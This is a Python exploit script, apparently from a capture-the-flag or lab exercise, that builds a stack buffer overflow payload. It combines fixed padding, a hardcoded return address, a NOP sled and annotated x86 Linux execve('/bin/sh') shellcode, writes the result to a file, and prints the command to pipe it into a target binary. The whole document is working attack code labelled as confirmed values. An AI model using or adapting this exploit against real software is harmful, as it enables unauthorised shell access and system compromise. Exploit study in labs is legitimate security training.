import struct

# Confirmed working values
OFFSET      = 76          # bytes to reach return address
RETURN_ADDR = 0xffffd640  # where shellcode lands on stack
NOP         = b'\x90' * 100  # nop sled

# x86 Linux execve("/bin/sh") shellcode - 23 bytes
shellcode = bytes([
    0x31, 0xc0,             # xor eax, eax
    0x50,                   # push eax
    0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
    0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
    0x89, 0xe3,             # mov ebx, esp
    0x89, 0xc1,             # mov ecx, eax
    0x89, 0xc2,             # mov edx, eax
    0xb0, 0x0b,             # mov al, 11
    0xcd, 0x80              # int 0x80
])

# Build payload
padding  = b'A' * OFFSET
ret_addr = struct.pack('<I', RETURN_ADDR)
payload  = padding + ret_addr + NOP + shellcode

# Save to file
with open('payload', 'wb') as f:
    f.write(payload)

print(f"[+] Offset:        {OFFSET} bytes")
print(f"[+] Return addr:   {hex(RETURN_ADDR)}")
print(f"[+] NOP sled:      {len(NOP)} bytes")
print(f"[+] Shellcode:     {len(shellcode)} bytes")
print(f"[+] Total payload: {len(payload)} bytes")
print(f"[+] Payload written to 'payload'")
print(f"[+] Run: (cat payload; cat) | ./target")
